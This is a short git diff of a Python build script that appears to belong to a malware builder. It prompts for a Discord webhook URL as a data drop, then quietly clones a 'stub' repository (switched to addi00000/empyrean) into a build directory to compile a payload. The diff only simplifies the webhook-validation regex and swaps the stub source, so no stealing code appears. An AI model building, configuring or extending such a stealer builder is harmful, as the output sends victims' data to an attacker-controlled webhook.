@@ -26,7 +26,7 @@ class Config:
                 "type": "input",
                 "name": "webhook",
                 "message": "Enter your webhook URL",
-                "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com|canary.discord.com|canary.discordapp.com|ptb.discord.com|ptb.discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
+                "validate": (lambda x: False if re.match(r"https://(canary.|ptb.)?(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
             },
             {
                 "type": "confirm",
@@ -95,9 +95,9 @@ class MakeEnv:
         Clones the source code from a specified repository into the build directory
         """
         subprocess.run(
-            ['git', 'clone', 'https://github.com/vooxil/stub.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         shutil.move(os.path.join(self.build_dir,
-                    'stub', 'src'), self.build_dir)
+                    'empyrean', 'src'), self.build_dir)
 
 
 class WriteConfig:
